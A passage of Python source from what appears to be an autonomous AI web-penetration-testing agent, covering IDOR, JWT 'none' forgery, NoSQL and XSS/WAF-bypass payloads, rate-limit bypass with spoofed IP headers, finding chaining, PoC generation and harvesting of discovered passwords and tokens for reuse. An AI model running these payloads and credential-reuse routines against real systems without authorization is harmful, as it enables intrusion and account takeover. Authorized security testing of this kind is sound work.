                statuses = [r.status for r in responses if hasattr(r, 'status')]
                if len(set(statuses)) > 1:
                    await self.log("info", f"  Inconsistent responses detected at {endpoint[:50]} - potential race condition")

            except Exception:
                pass

    async def _test_rate_limit_fallback(self):
        """Test for rate limiting bypass without LLM"""
        await self.log("info", "  Testing Rate Limiting...")

        headers_to_try = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
        ]

        for endpoint in [self.target]:
            for headers in headers_to_try:
                try:
                    # Send many requests
                    for i in range(20):
                        headers["X-Forwarded-For"] = f"192.168.1.{i}"
                        async with self.session.get(endpoint, headers=headers) as resp:
                            if resp.status == 429:
                                await self.log("info", f"  Rate limit hit at request {i}")
                                break
                            if i == 19:
                                await self.log("warning", f"  [POTENTIAL] No rate limiting detected with header bypass")
                except Exception:
                    pass

    async def _test_idor_fallback(self):
        """Test for IDOR/BOLA without LLM"""
        await self.log("info", "  Testing IDOR/BOLA...")

        # Find endpoints with numeric parameters
        for param, endpoints in self.recon.parameters.items():
            for endpoint in endpoints[:2]:
                url = _get_endpoint_url(endpoint) if isinstance(endpoint, dict) else endpoint
                if not url:
                    continue

                # Try changing IDs
                for test_id in ["1", "2", "0", "-1", "9999999"]:
                    try:
                        parsed = urlparse(url)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={test_id}"
                        async with self.session.get(test_url) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                if len(body) > 100:
                                    await self.log("debug", f"  Got response for {param}={test_id}")
                    except Exception:
                        pass

    async def _test_bfla_fallback(self):
        """Test for BFLA without LLM"""
        await self.log("info", "  Testing BFLA (Broken Function Level Authorization)...")

        admin_paths = ["/admin", "/api/admin", "/api/v1/admin", "/manage", "/dashboard", "/internal"]

        for path in admin_paths:
            try:
                url = urljoin(self.target, path)
                async with self.session.get(url) as resp:
                    if resp.status == 200:
                        await self.log("warning", f"  [POTENTIAL] Admin endpoint accessible: {url}")
                    elif resp.status in [401, 403]:
                        await self.log("debug", f"  Protected: {url}")
            except Exception:
                pass

    async def _test_jwt_fallback(self):
        """Test for JWT vulnerabilities without LLM"""
        await self.log("info", "  Testing JWT vulnerabilities...")

        # Try none algorithm and other JWT attacks
        jwt_tests = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.test",
        ]

        for endpoint in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:3]]:
            if not endpoint:
                continue
            for jwt in jwt_tests:
                try:
                    headers = {"Authorization": f"Bearer {jwt}"}
                    async with self.session.get(endpoint, headers=headers) as resp:
                        if resp.status == 200:
                            await self.log("debug", f"  JWT accepted at {endpoint[:50]}")
                except Exception:
                    pass

    async def _test_graphql_fallback(self):
        """Test for GraphQL vulnerabilities without LLM"""
        await self.log("info", "  Testing GraphQL...")

        graphql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        introspection_query = '{"query": "{ __schema { types { name } } }"}'

        for path in graphql_endpoints:
            try:
                url = urljoin(self.target, path)
                headers = {"Content-Type": "application/json"}
                async with self.session.post(url, data=introspection_query, headers=headers) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if "__schema" in body or "types" in body:
                            finding = Finding(
                                id=hashlib.md5(f"graphql{url}".encode()).hexdigest()[:8],
                                title="GraphQL Introspection Enabled",
                                severity="low",
                                vulnerability_type="graphql_introspection",
                                cvss_score=3.0,
                                cwe_id="CWE-200",
                                description="GraphQL introspection is enabled, exposing the entire API schema.",
                                affected_endpoint=url,
                                evidence=body[:500],
                                remediation="Disable introspection in production environments.",
                                ai_verified=False
                            )
                            await self._add_finding(finding)
                            await self.log("warning", f"  [FOUND] GraphQL introspection at {url}")
            except Exception:
                pass

    async def _test_nosql_fallback(self):
        """Test for NoSQL injection without LLM"""
        await self.log("info", "  Testing NoSQL injection...")

        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
            "[$gt]=&",
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        ]

        for param, endpoints in list(self.recon.parameters.items())[:5]:
            for endpoint in endpoints[:2]:
                url = _get_endpoint_url(endpoint) if isinstance(endpoint, dict) else endpoint
                if not url:
                    continue
                for payload in nosql_payloads:
                    try:
                        test_url = f"{url.split('?')[0]}?{param}={payload}"
                        async with self.session.get(test_url) as resp:
                            body = await resp.text()
                            if resp.status == 200 and len(body) > 100:
                                await self.log("debug", f"  NoSQL payload accepted: {param}={payload[:30]}")
                    except Exception:
                        pass

    async def _test_waf_bypass_fallback(self):
        """Test for WAF bypass without LLM"""
        await self.log("info", "  Testing WAF bypass techniques...")

        bypass_payloads = [
            "<script>alert(1)</script>",  # Original
            "<scr<script>ipt>alert(1)</script>",  # Nested
            "<img src=x onerror=alert(1)>",  # Event handler
            "<<script>script>alert(1)<</script>/script>",  # Double encoding
            "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded
        ]

        for endpoint in [self.target]:
            for payload in bypass_payloads:
                try:
                    test_url = f"{endpoint}?test={payload}"
                    async with self.session.get(test_url) as resp:
                        if resp.status == 403:
                            await self.log("debug", f"  WAF blocked: {payload[:30]}")
                        elif resp.status == 200:
                            body = await resp.text()
                            if payload in body or "alert(1)" in body:
                                await self.log("warning", f"  [POTENTIAL] WAF bypass: {payload[:30]}")
                except Exception:
                    pass

    async def _test_csp_bypass_fallback(self):
        """Test for CSP bypass without LLM"""
        await self.log("info", "  Testing CSP bypass...")

        try:
            async with self.session.get(self.target) as resp:
                csp = resp.headers.get("Content-Security-Policy", "")

                if not csp:
                    await self.log("warning", "  No CSP header found")
                    return

                # Check for weak CSP
                weaknesses = []
                if "unsafe-inline" in csp:
                    weaknesses.append("unsafe-inline allows inline scripts")
                if "unsafe-eval" in csp:
                    weaknesses.append("unsafe-eval allows eval()")
                if "*" in csp:
                    weaknesses.append("Wildcard (*) in CSP is too permissive")
                if "data:" in csp:
                    weaknesses.append("data: URI scheme can be abused")

                if weaknesses:
                    finding = Finding(
                        id=hashlib.md5(f"csp{self.target}".encode()).hexdigest()[:8],
                        title="Weak Content Security Policy",
                        severity="medium",
                        vulnerability_type="csp_bypass",
                        cvss_score=4.0,
                        cwe_id="CWE-693",
                        description=f"CSP has weaknesses: {'; '.join(weaknesses)}",
                        affected_endpoint=self.target,
                        evidence=f"CSP: {csp[:500]}",
                        remediation="Remove unsafe-inline, unsafe-eval, wildcards, and data: from CSP.",
                        ai_verified=False
                    )
                    await self._add_finding(finding)
                    await self.log("warning", f"  [FOUND] Weak CSP: {', '.join(weaknesses)}")
        except Exception:
            pass

    async def _ai_test_vulnerability(self, vuln_type: str):
        """Wrapper for backwards compatibility - now uses AI dynamic test"""
        await self._ai_dynamic_test(vuln_type)

    async def _execute_ai_test(self, test: Dict, vuln_type: str):
        """Execute an AI-generated test"""
        if not self.session:
            return

        try:
            url = test.get("url", self.target)
            method = test.get("method", "GET").upper()
            headers = test.get("headers", {})
            params = test.get("params", {})
            check = test.get("check", "")

            if method == "GET":
                async with self.session.get(url, params=params, headers=headers) as resp:
                    body = await resp.text()
                    response_headers = dict(resp.headers)
            else:
                async with self.session.post(url, data=params, headers=headers) as resp:
                    body = await resp.text()
                    response_headers = dict(resp.headers)

            # Use AI to analyze if vulnerability exists
            if self.llm.is_available() and check:
                analysis_prompt = f"""Analyze this response for {vuln_type} vulnerability.
Check for: {check}

Response status: {resp.status}
Response headers: {dict(list(response_headers.items())[:10])}
Response body (first 1000 chars): {body[:1000]}

Is this vulnerable? Respond with:
VULNERABLE: <evidence>
or
NOT_VULNERABLE: <reason>"""

                result = await self.llm.generate(analysis_prompt, get_system_prompt("verification"), task_type="response_quality")
                if "VULNERABLE:" in result.upper():
                    evidence = result.split(":", 1)[1].strip() if ":" in result else result

                    # Anti-hallucination: verify AI evidence in actual response
                    if not self._evidence_in_response(evidence, body):
                        await self.log("debug", f"  [REJECTED] AI evidence not grounded in response for {vuln_type}")
                        return

                    mapped = self._map_vuln_type(vuln_type)
                    finding = Finding(
                        id=hashlib.md5(f"{vuln_type}{url}ai".encode()).hexdigest()[:8],
                        title=self.vuln_registry.get_title(mapped) or f"AI-Detected {vuln_type.title()} Vulnerability",
                        severity=self._get_severity(vuln_type),
                        vulnerability_type=vuln_type,
                        cvss_score=self._get_cvss_score(vuln_type),
                        cvss_vector=self._get_cvss_vector(vuln_type),
                        cwe_id=self.vuln_registry.get_cwe_id(mapped) or "",
                        description=self.vuln_registry.get_description(mapped) or f"AI analysis detected potential {vuln_type} vulnerability.",
                        affected_endpoint=url,
                        evidence=evidence[:500],
                        remediation=self.vuln_registry.get_remediation(mapped) or f"Review and remediate the {vuln_type} vulnerability.",
                        ai_verified=True
                    )
                    await self._add_finding(finding)
                    await self.log("warning", f"  [AI FOUND] {vuln_type} at {url[:50]}")

        except Exception as e:
            await self.log("debug", f"  AI test execution error: {e}")

    async def _test_single_param(self, base_url: str, param: str, payload: str, vuln_type: str):
        """Test a single parameter with a payload"""
        if not self.session:
            return

        try:
            # Build test URL
            parsed = urlparse(base_url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_url = f"{base}?{param}={payload}"

            async with self.session.get(test_url) as resp:
                body = await resp.text()
                response_data = {
                    "status": resp.status,
                    "body": body,
                    "headers": dict(resp.headers),
                    "url": str(resp.url),
                    "method": "GET",
                    "content_type": resp.headers.get("Content-Type", "")
                }

                is_vuln, evidence = await self._verify_vulnerability(vuln_type, payload, response_data)
                if is_vuln:
                    await self.log("warning", f"    [POTENTIAL] {vuln_type.upper()} found in {param}")
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, test_url, param, payload, evidence, response_data
                    )
                    if finding:
                        await self._add_finding(finding)

        except Exception as e:
            await self.log("debug", f"    Test error: {e}")

    async def log_script(self, level: str, message: str):
        """Log a script/tool message"""
        await self.log(level, message)

    async def log_llm(self, level: str, message: str):
        """Log an LLM/AI message - prefixed with [AI] or [LLM]"""
        if not message.startswith('[AI]') and not message.startswith('[LLM]'):
            message = f"[AI] {message}"
        await self.log(level, message)

    async def _add_finding(self, finding: Finding):
        """Add a finding through memory (dedup + bounded + evidence check)"""
        added = self.memory.add_finding(finding)
        if not added:
            reason = "duplicate" if self.memory.has_finding_for(
                finding.vulnerability_type, finding.affected_endpoint, finding.parameter
            ) else "rejected by memory (missing evidence, speculative, or at capacity)"
            await self.log("info", f"    [SKIP] {finding.title} - {reason}")
            return

        await self.log("warning", f"    [FOUND] {finding.title} - {finding.severity}")

        # AI exploitation validation
        try:
            validation = await self._ai_validate_exploitation(asdict(finding))
            if validation:
                if validation.get("false_positive_risk") in ("medium", "high"):
                    await self.log("warning", f"    [AI] False positive risk: {validation['false_positive_risk']} for {finding.title}")
                if validation.get("exploitation_notes"):
                    finding.evidence = f"{finding.evidence or ''} | [AI Validation] {validation['exploitation_notes']}"
                    await self.log("info", f"    [AI] Exploitation notes: {validation['exploitation_notes'][:100]}")
        except Exception:
            pass

        # Generate PoC code for the confirmed finding
        if not finding.poc_code:
            try:
                finding.poc_code = self.poc_generator.generate(
                    finding.vulnerability_type,
                    finding.affected_endpoint,
                    finding.parameter,
                    finding.payload,
                    finding.evidence,
                    method=finding.request.split()[0] if finding.request else "GET"
                )
            except Exception:
                pass

        # Record success in execution history for cross-scan learning
        if self.execution_history:
            try:
                self.execution_history.record(
                    self.recon.technologies,
                    finding.vulnerability_type,
                    finding.affected_endpoint,
                    True,
                    finding.evidence or ""
                )
            except Exception:
                pass

        # Record in persistent cross-session memory
        if self.persistent_mem:
            try:
                domain = urlparse(self.target).netloc
                await self.persistent_mem.record_attack(
                    domain=domain,
                    vuln_type=finding.vulnerability_type,
                    success=True,
                    payload=finding.payload,
                    parameter=finding.parameter,
                    endpoint=finding.affected_endpoint,
                    tech_stack=list(self.recon.technologies) if self.recon.technologies else None,
                    confidence=float(finding.confidence_score) if finding.confidence_score else 0.0,
                    severity=finding.severity,
                )
            except Exception:
                pass

        # Capture screenshot for the confirmed finding
        await self._capture_finding_screenshot(finding)

        # Chain engine: derive new targets from this finding
        if self.chain_engine:
            try:
                derived = await self.chain_engine.on_finding(finding, self.recon, self.memory)
                if derived:
                    await self.log("info", f"    [CHAIN] {len(derived)} derived targets from {finding.vulnerability_type}")
                    for chain_target in derived[:5]:  # Limit to 5 derived targets per finding
                        await self.log("info", f"    [CHAIN] Testing {chain_target.vuln_type} → {chain_target.url[:50]}")
                        try:
                            chain_finding = await self._test_vulnerability_type(
                                chain_target.url,
                                chain_target.vuln_type,
                                "GET",
                                [chain_target.param] if chain_target.param else ["id"]
                            )
                            if chain_finding:
                                chain_finding.evidence = f"{chain_finding.evidence or ''} [CHAIN from {finding.id}: {finding.vulnerability_type}]"
                                await self._add_finding(chain_finding)
                        except Exception as e:
                            await self.log("debug", f"    [CHAIN] Test failed: {e}")
            except Exception as e:
                await self.log("debug", f"    [CHAIN] Engine error: {e}")

        # Feed discovered credentials to auth manager
        if self.auth_manager and finding.vulnerability_type in (
            "information_disclosure", "api_key_exposure", "default_credentials",
            "weak_password", "hardcoded_secrets"
        ):
            try:
                cred_pattern = re.findall(
                    r'(?:password|passwd|pwd|pass|api_key|apikey|token|secret)[=:"\s]+([^\s"\'&,;]{4,})',
                    finding.evidence or "", re.IGNORECASE
                )
                for cred_val in cred_pattern[:3]:
                    self.auth_manager.add_credentials(
                        username="discovered", password=cred_val,
                        role="user", source="discovered"
                    )
                    await self.log("info", f"    [AUTH] Discovered credential fed to auth manager")
            except Exception:
                pass

        if self.finding_callback:
            try:
                await self.finding_callback(asdict(finding))
            except Exception as e:
                print(f"Finding callback error: {e}")

    async def _run_differential_probes(self):
        """Run differential access control probes using multiple credential contexts.

        For each discovered endpoint, make requests with each authenticated context
        and use the diff engine to detect BOLA/BFLA/privilege escalation.
        """
        if not self._diff_engine or not self.auth_manager or not self.session:
            return

        from backend.core.access_control_diff import ContextResponse

        # Collect endpoints to probe
        endpoints = []
        for ep in self.recon.endpoints[:30]:
            url = _get_endpoint_url(ep)
            method = _get_endpoint_method(ep)
            if url:
                endpoints.append((url, method))
        for url in self.recon.api_endpoints[:20]:
            if url and (url, "GET") not in endpoints:
                endpoints.append((url, "GET"))

        if not endpoints:
            await self.log("info", "[DIFF] No endpoints to probe for differential testing")
            return

        authenticated_contexts = [
            (label, ctx) for label, ctx in self.auth_manager.contexts.items()
            if ctx.state == "authenticated"
        ]
        if len(authenticated_contexts) < 2:
            await self.log("info", f"[DIFF] Need 2+ authenticated contexts, have {len(authenticated_contexts)} — skipping")
            return

        await self.log("info", f"[DIFF] Probing {len(endpoints)} endpoints with {len(authenticated_contexts)} contexts")
        total_findings = 0

        for ep_url, ep_method in endpoints:
            if self.is_cancelled():
                break

            responses = []
            for label, ctx in authenticated_contexts:
                try:
                    req_kwargs = self.auth_manager.get_request_kwargs(label)
                    headers = {**self.auth_headers, **req_kwargs.get("headers", {})}
                    cookies = req_kwargs.get("cookies", {})
                    if cookies:
                        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                        headers["Cookie"] = cookie_str

                    import time as _time
                    t0 = _time.time()
                    async with self.session.request(
                        ep_method, ep_url, headers=headers,
                        allow_redirects=False, ssl=False, timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        body = await resp.text()
                        latency = (_time.time() - t0) * 1000
                        responses.append(ContextResponse(
                            label=label,
                            role=ctx.role,
                            status=resp.status,
                            body=body[:10000],
                            headers=dict(resp.headers),
                            latency_ms=latency,
                        ))
                except Exception as e:
                    responses.append(ContextResponse(
                        label=label, role=ctx.role, status=0, error=str(e),
                    ))

            # Run diff analysis
            diffs = self._diff_engine.compare(ep_url, ep_method, responses)
            for diff in diffs:
                if diff.confidence < 0.55:
                    continue
                finding_dict = self._diff_engine.finding_to_dict(diff)
                finding = Finding(
                    id=f"diff_{hashlib.md5(f'{ep_url}_{diff.finding_type}_{diff.attacker_label}'.encode()).hexdigest()[:12]}",
                    title=finding_dict["title"],
                    severity=finding_dict["severity"],
                    vulnerability_type=finding_dict["vulnerability_type"],
                    affected_endpoint=finding_dict["affected_endpoint"],
                    evidence=finding_dict["evidence"],
                    description=finding_dict["description"],
                    remediation=finding_dict.get("remediation", ""),
                    cwe_id=finding_dict.get("cwe_id", ""),
                    references=finding_dict.get("references", []),
                    credential_label=finding_dict.get("credential_label", ""),
                    auth_context=finding_dict.get("auth_context", {}),
                    confidence=str(int(diff.confidence * 100)),
                    confidence_score=int(diff.confidence * 100),
                )
                await self._add_finding(finding)
                total_findings += 1

        await self.log("info", f"[DIFF] Differential testing complete: {total_findings} findings")

    async def _capture_finding_screenshot(self, finding: Finding):
        """Capture a browser screenshot for a confirmed vulnerability finding.

        Uses Playwright via BrowserValidator to navigate to the affected
        endpoint and take a full-page screenshot. Screenshots are stored in
        reports/screenshots/{scan_id}/{finding_id}/ when scan_id is available,
        or reports/screenshots/{finding_id}/ as fallback. Screenshots are also
        embedded as base64 in the finding's screenshots list for HTML reports.
        """
        if not self.browser_validation_enabled or not HAS_PLAYWRIGHT or BrowserValidator is None:
            return

        url = finding.affected_endpoint
        if not url or not url.startswith(("http://", "https://")):
            return

        try:
            # Organize screenshots by scan_id subfolder
            if self.scan_id:
                screenshots_dir = f"reports/screenshots/{self.scan_id}"
            else:
                screenshots_dir = "reports/screenshots"
            validator = BrowserValidator(screenshots_dir=screenshots_dir)
            await validator.start(headless=True)
            try:
                result = await validator.validate_finding(
                    finding_id=finding.id,
                    url=url,
                    payload=finding.payload,
                    timeout=15000
                )
                # Embed screenshots as base64 data URIs
                for ss_path in result.get("screenshots", []):
                    data_uri = embed_screenshot(ss_path)
                    if data_uri:
                        finding.screenshots.append(data_uri)

                if finding.screenshots:
                    await self.log("info", f"    [SCREENSHOT] Captured {len(finding.screenshots)} screenshot(s) for {finding.id}")
            finally:
                await validator.stop()
        except Exception as e:
            await self.log("debug", f"    Screenshot capture failed for {finding.id}: {e}")

    def _normalize_target(self, target: str) -> str:
        """Ensure target has proper scheme"""
        if not target.startswith(('http://', 'https://')):
            return f"https://{target}"
        return target

    async def _default_log(self, level: str, message: str):
        timestamp = datetime.utcnow().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level.upper()}] {message}")

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=30)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        headers.update(self.auth_headers)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers,
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        )

        # Resolve opsec jitter range from profile
        jitter_range = None
        try:
            from core.opsec_manager import OpsecManager
            opsec = OpsecManager()
            jitter_range = opsec.get_jitter_range()
            if jitter_range and jitter_range[1] > 0:
                await self.log("info", f"Opsec jitter enabled: {jitter_range[0]*1000:.0f}-{jitter_range[1]*1000:.0f}ms")
        except Exception:
            pass

        # Initialize autonomy modules that depend on session
        self.request_engine = RequestEngine(
            self.session, default_delay=0.1, max_retries=3,
            is_cancelled_fn=self.is_cancelled,
            jitter_range=jitter_range,
            governance=self.governance,
        )
        if self.waf_evasion_enabled:
            self.waf_detector = WAFDetector(self.request_engine)
        self.strategy = StrategyAdapter(self.memory)
        self.auth_manager = AuthManager(self.request_engine, self.recon)

        # Multi-credential differential access control testing
        if self.credential_sets and len(self.credential_sets) >= 2:
            try:
                from backend.core.access_control_diff import AccessControlDiffEngine
                self.auth_manager.seed_from_credential_sets(self.credential_sets)
                context_labels = [
                    (cs.get("label", f"ctx_{i}"), cs.get("role", "user"))
                    for i, cs in enumerate(self.credential_sets)
                ]
                self._diff_engine = AccessControlDiffEngine(context_labels)
                await self.log("info", f"[DIFF] Access control diff engine initialized with {len(self.credential_sets)} contexts")
                # Authenticate any login-flow contexts
                for label, ctx in self.auth_manager.contexts.items():
                    if ctx.state == "unauthenticated" and ctx.credential:
                        success = await self.auth_manager.authenticate(label)
                        if success:
                            await self.log("info", f"[DIFF] Authenticated context '{label}' via login flow")
                        else:
                            await self.log("warning", f"[DIFF] Failed to authenticate context '{label}'")
            except Exception as e:
                await self.log("warning", f"[DIFF] Failed to init diff engine: {e}")
                self._diff_engine = None

        # Connect MCP tools
        if self.mcp_client and self.mcp_client.enabled:
            try:
                for server_name in self.mcp_client.servers_config:
                    await self.mcp_client.connect(server_name)
                mcp_tools = await self.mcp_client.list_tools()
                tool_count = sum(len(t) for t in mcp_tools.values())
                await self.log("info", f"MCP tools connected ({tool_count} tools available)")
            except Exception:
                pass

        # Set governance context for in-process MCP server
        if self.governance:
            try:
                from core.mcp_server import set_mcp_governance
                set_mcp_governance(self.governance)
            except ImportError:
                pass

        return self

    async def __aexit__(self, *args):
        # Clear governance context for in-process MCP server
        try:
            from core.mcp_server import clear_mcp_governance
            clear_mcp_governance()
        except ImportError:
            pass

        # Disconnect MCP tools
        if self.mcp_client:
            try:
                await self.mcp_client.disconnect_all()
            except Exception:
                pass

        # Cleanup per-scan sandbox container
        if self.scan_id and self._sandbox:
            try:
                from core.container_pool import get_pool
                await get_pool().destroy(self.scan_id)
                self._sandbox = None
            except Exception:
                pass
        if self.session:
            await self.session.close()

    async def _init_bugbounty_scope(self):
        """Initialize bug bounty scope checking if enabled."""
        self._scope_parser = None
        if os.getenv('ENABLE_BUGBOUNTY_INTEGRATION', 'false').lower() != 'true':
            return
        try:
            from backend.core.bugbounty.hackerone_client import HackerOneClient
            from backend.core.bugbounty.scope_parser import ScopeParser
            client = HackerOneClient()
            if not client.enabled:
                return
            # Derive program handle from lab_context or scan metadata
            handle = (self.lab_context or {}).get("bugbounty_handle", "")
            if not handle:
                return
            async with aiohttp.ClientSession() as sess:
                scope_data = await client.get_scope(handle, sess)
            if scope_data.get("in_scope"):
                self._scope_parser = ScopeParser(scope_data)
                await self.log("info", f"Bug bounty scope loaded: {len(scope_data['in_scope'])} in-scope assets")
        except Exception as e:
            await self.log("warning", f"Bug bounty scope init failed: {e}")

    def _is_url_in_scope(self, url: str) -> bool:
        """Check if URL is within bug bounty scope. Returns True if no scope set."""
        if not hasattr(self, '_scope_parser') or not self._scope_parser:
            return True
        return self._scope_parser.is_in_scope(url)

    async def run(self) -> Dict[str, Any]:
        """Main execution method"""
        await self.log("info", "=" * 60)
        await self.log("info", "  NEUROSPLOIT AI SECURITY AGENT")
        await self.log("info", "=" * 60)
        await self.log("info", f"Target: {self.target}")
        await self.log("info", f"Mode: {self.mode.value}")

        # Initialize bug bounty scope checking
        await self._init_bugbounty_scope()

        if self.llm.is_available():
            await self.log("success", f"LLM Provider: {self.llm.provider.upper()} (Connected)")
        else:
            await self.log("error", "=" * 60)
            await self.log("error", "  WARNING: LLM NOT CONFIGURED!")
            await self.log("error", "=" * 60)
            await self.log("warning", "Set ANTHROPIC_API_KEY in .env file")
            await self.log("warning", "Running with basic detection only (no AI enhancement)")
            if self.llm.error_message:
                await self.log("warning", f"Reason: {self.llm.error_message}")

        await self.log("info", "")

        try:
            if self.mode == OperationMode.RECON_ONLY:
                return await self._run_recon_only()
            elif self.mode == OperationMode.FULL_AUTO:
                return await self._run_full_auto()
            elif self.mode == OperationMode.PROMPT_ONLY:
                return await self._run_prompt_only()
            elif self.mode == OperationMode.ANALYZE_ONLY:
                return await self._run_analyze_only()
            elif self.mode == OperationMode.AUTO_PENTEST:
                return await self._run_auto_pentest()
            else:
                return await self._run_full_auto()
        except Exception as e:
            await self.log("error", f"Agent error: {str(e)}")
            import traceback
            traceback.print_exc()
            return self._generate_error_report(str(e))

    async def _update_progress(self, progress: int, phase: str):
        if self.progress_callback:
            await self.progress_callback(progress, phase)

    # ==================== RECONNAISSANCE ====================

    async def _connectivity_precheck(self) -> bool:
        """TCP + HTTP pre-check — fail fast if target is unreachable."""
        import socket
        parsed = urlparse(self.target)
        host = parsed.hostname or parsed.netloc
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)

        # TCP connect test
        try:
            loop = asyncio.get_event_loop()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            await loop.run_in_executor(None, sock.connect, (host, port))
            sock.close()
            await self.log("info", f"  [PRE-CHECK] TCP connect to {host}:{port} OK")
        except Exception as e:
            await self.log("error", f"  [PRE-CHECK] TCP connect to {host}:{port} FAILED: {e}")
            return False

        # HTTP probe
        try:
            async with self.session.get(self.target, ssl=False, allow_redirects=True) as resp:
                await self.log("info", f"  [PRE-CHECK] HTTP probe: {resp.status} ({resp.headers.get('Server', 'unknown')})")
                return True
        except Exception as e:
            await self.log("error", f"  [PRE-CHECK] HTTP probe failed: {e}")
            return False

    def _filter_waf_by_confidence(self, waf_result):
        """Remove detected WAFs below the confidence threshold."""
        if waf_result and waf_result.detected_wafs:
            waf_result.detected_wafs = [
                w for w in waf_result.detected_wafs
                if w.confidence >= self.waf_confidence_threshold
            ]
        return waf_result

    async def _run_recon_only(self) -> Dict:
        """Comprehensive reconnaissance"""
        await self._update_progress(0, "Starting reconnaissance")

        # Pre-check: verify target is reachable
        reachable = await self._connectivity_precheck()
        if not reachable:
            await self.log("warning", "[RECON] Target unreachable — attempting recon anyway")

        # Enhanced recon only for RECON_ONLY mode (not when called by FULL_AUTO)
        enhanced = False
        if self.mode == OperationMode.RECON_ONLY:
            enhanced = await self._run_enhanced_recon()

        if not enhanced:
            # Phase 1: Initial probe
            await self.log("info", "[PHASE 1/5] Initial Probe")
            await self._initial_probe()
            await self._update_progress(15, "Initial probe complete")

            # Phase 2: Tech detection (moved earlier so endpoints can adapt)
            await self.log("info", "[PHASE 2/5] Technology Detection")
            await self._detect_technologies()
            await self._update_progress(30, "Tech detection complete")

            # Phase 3: Endpoint discovery (now uses tech stack for dynamic paths)
            await self.log("info", "[PHASE 3/5] Endpoint Discovery")
            await self._discover_endpoints()
            await self._update_progress(55, "Endpoint discovery complete")

            # Phase 4: Deep JS analysis (fetch + parse JS bundles for API routes)
            await self.log("info", "[PHASE 4/5] JS Route Extraction")
            await self._deep_js_analysis()
            await self._update_progress(75, "JS analysis complete")

            # Phase 5: Parameter discovery
            await self.log("info", "[PHASE 5/5] Parameter Discovery")
            await self._discover_parameters()
            await self._update_progress(85, "Parameter discovery complete")

            # Phase 5b: Validate discovered endpoints
            await self._validate_endpoints()
            await self._update_progress(90, "Endpoint validation complete")

        # WAF detection (new for RECON_ONLY; FULL_AUTO already does this in Phase 1b)
        if self.mode == OperationMode.RECON_ONLY and self.waf_detector and not self._waf_result:
            try:
                await self.log("info", "[RECON] WAF Detection")
                self._waf_result = await self.waf_detector.detect(self.target)
                self._waf_result = self._filter_waf_by_confidence(self._waf_result)
                if self._waf_result and self._waf_result.detected_wafs:
                    waf_data = {
                        "detected": True,
                        "wafs": [],
                        "blocking_patterns": self._waf_result.blocking_patterns,
                        "recommended_delay": self._waf_result.recommended_delay,
                    }
                    for w in self._waf_result.detected_wafs:
                        waf_label = f"WAF:{w.name} ({w.confidence:.0%})"
                        if waf_label not in self.recon.technologies:
                            self.recon.technologies.append(waf_label)
                        waf_data["wafs"].append({
                            "name": w.name,
                            "confidence": w.confidence,
                            "detection_method": w.detection_method,
                            "evidence": w.evidence,
                        })
                        await self.log("warning", f"[WAF] Detected: {w.name} "
                                       f"(confidence: {w.confidence:.0%})")
                    self.recon.waf_info = waf_data
                else:
                    await self.log("info", "[WAF] No WAF detected")
                    self.recon.waf_info = {"detected": False, "wafs": []}
            except Exception as e:
                await self.log("debug", f"[WAF] Detection failed: {e}")

        # AI Attack Surface Analysis (enriches report when LLM is available)
        ai_analysis = None
        if self.mode == OperationMode.RECON_ONLY:
            await self._update_progress(85, "Running AI analysis")
            await self.log("info", "[RECON] Phase: AI Attack Surface Analysis")
            ai_analysis = await self._ai_analyze_recon_data()

        await self._update_progress(100, "Reconnaissance complete")
        return self._generate_recon_report(ai_analysis=ai_analysis)

    async def _ai_analyze_recon_data(self) -> Optional[Dict]:
        """Use AI to analyze reconnaissance data and produce expert-level insights.

        Returns a dict with analysis sections, or None if LLM is unavailable.
        This enriches the recon report with AI-generated intelligence.
        """
        if not self.llm.is_available():
            await self.log("debug", "[RECON] LLM not available, skipping AI analysis")
            return None

        await self.log("info", "[RECON] AI Attack Surface Analysis starting...")

        # --- Build context strings from recon data, with sensible truncation ---

        def _format_list(items, max_items=30, formatter=str):
            if not items:
                return "None discovered"
            formatted = [formatter(item) for item in items[:max_items]]
            result = "\n".join(f"  - {item}" for item in formatted)
            if len(items) > max_items:
                result += f"\n  ... and {len(items) - max_items} more"
            return result

        def _fmt_endpoint(ep):
            url = _get_endpoint_url(ep)
            method = _get_endpoint_method(ep)
            status = ep.get("status_code", "") if isinstance(ep, dict) else ""
            return f"[{method}] {url}" + (f" (status: {status})" if status else "")

        def _fmt_port(p):
            if isinstance(p, dict):
                return f"{p.get('port', p)}/{p.get('protocol', 'tcp')} - {p.get('service', 'unknown')}"
            return str(p)

        def _fmt_path(p):
